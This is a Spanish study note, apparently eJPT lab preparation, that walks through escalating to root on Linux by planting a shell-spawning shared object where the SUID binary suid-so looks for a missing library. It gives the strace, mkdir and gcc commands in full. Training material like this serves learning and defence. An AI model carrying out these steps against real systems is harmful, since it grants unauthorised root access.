- El ejecutable /usr/local/bin/suid-so SUID es vulnerable a la inyección de objetos - compartidos

- First, execute the file and note that currently it displays a progress bar before exiting:

```
/usr/local/bin/suid-so
```

- Ejecute strace en el archivo y busque en la salida llamadas de apertura/acceso y errores de "no existe tal archivo":

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
Tenga en cuenta que el ejecutable intenta cargar el objeto compartido /home/user/.config/libcalc.so dentro de nuestro directorio de inicio, pero no lo puede encontrar. 

- Cree el directorio .config para el archivo libcalc.so:

```
mkdir /home/user/.config
```

- Puede encontrar un ejemplo de código objeto compartido en /home/user/tools/suid/libcalc.c. Simplemente genera un shell Bash. Compile el código en un objeto compartido en la ubicación donde lo buscaba el ejecutable suid-so:

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

- Ejecute el ejecutable suid-so nuevamente y observe que esta vez, en lugar de una barra de progreso, obtenemos un shell raíz.

```
/usr/local/bin/suid-so
```



enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables  Known - Exploits]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Environment Variables]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Abusing Shell Features (1)]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Abusing Shell Features (2)]]